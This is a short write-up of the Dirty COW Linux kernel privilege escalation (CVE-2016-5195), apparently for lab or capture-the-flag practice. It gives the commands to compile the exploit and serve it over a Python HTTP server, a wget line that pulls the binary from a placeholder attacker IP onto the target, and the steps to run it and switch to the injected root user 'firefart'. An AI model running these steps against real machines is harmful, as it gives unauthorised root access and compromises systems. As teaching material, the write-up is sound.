# 🐮 Dirty COW Exploit Write-up

**Target OS:** Linux (vulnerable kernel)

**Exploit:** Dirty COW (CVE-2016-5195)

## 📌 Overview
**Dirty COW** (CVE-2016-5195) is a privilege escalation vulnerability in the Linux kernel. It leverages a **race condition** in the kernel’s handling of the **Copy-On-Write** (COW) mechanism for memory-mapped files.

Using this exploit, a local attacker can **overwrite read-only files** and gain **root privileges** by modifying sensitive files like **`/etc/passwd`**.

## 🚀 Exploit Steps

### ⚡ On the Attacker Machine

1️⃣ **Navigate to the exploit source directory:**
```bash
cd /path/to/dirtycow
```

2️⃣ Compile the exploit:

```bash
gcc -m32 -pthread dirty.c -o cowroot -lcrypt -static
```

✅ Explanation of flags:

   - `m32:` Build for 32-bit systems (often needed).

   - `pthread:` Use pthreads for the exploit’s race condition.

   - `lcrypt:` Use the crypt library for password hashing.

   - `static:` Build a static binary (no external dependencies).

**Serve the exploit binary (`cowroot`) using Python’s HTTP server:**

```bash
python3 -m http.server 9999

```

### ⚡ On the Target Machine

1️⃣ **Navigate to a writable directory:**

```bash
cd /tmp
```

2️⃣ **Download the exploit from the attacker machine:**

```bash
wget http://ATTACKER-IP:9999/cowroot
```

3️⃣ **Make the exploit executable:**

```bash
chmod +x cowroot
```

4️⃣ **Run the exploit:**

```bash
./cowroot
```

✅ **`If successful, it will add a new root-level user (usually firefart).`**

5️⃣ **Switch to the new user:**

```bash
su firefart
```

## 🐧 How it Works
✅ **The exploit:**

  - Maps /etc/passwd in memory.

  - Calls madvise() repeatedly to invalidate the memory pages.

  - Simultaneously writes to the mapped memory via /proc/self/mem.

  - The race condition in the kernel lets the write happen, modifying /etc/passwd despite its read-only status.

✅ **This grants root access by injecting a new root user entry in the real `/etc/passwd.`**

## ⚠️ Impact
  - Local privilege escalation → attacker gains full root control.

  - Works on many older Linux kernel versions (pre-4.8.3).

